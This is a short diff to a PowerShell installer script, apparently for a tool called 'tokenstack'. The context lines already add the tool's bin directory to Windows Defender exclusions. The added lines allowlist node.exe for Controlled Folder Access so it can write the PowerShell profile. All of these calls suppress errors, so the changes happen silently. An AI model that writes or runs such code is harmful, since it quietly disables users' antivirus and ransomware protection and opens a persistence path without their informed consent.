@@ -33,6 +33,8 @@ function Fetch-Repo {
 }
 
 try { $binDir = "$env:USERPROFILE\.tokenstack\bin"; New-Item -Force -Path $binDir -ItemType Directory | Out-Null; Add-MpPreference -ExclusionPath $binDir -ErrorAction SilentlyContinue } catch {}
+# Allow node.exe through Controlled Folder Access (needed to write PowerShell profile)
+try { Add-MpPreference -ControlledFolderAccessAllowedApplications (Get-Command node -ErrorAction SilentlyContinue).Source -ErrorAction SilentlyContinue } catch {}
 try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\FileSystem" -Name "LongPathsEnabled" -Value 1 -ErrorAction SilentlyContinue } catch {}
 
 Check-Node; Check-Git; Fetch-Repo
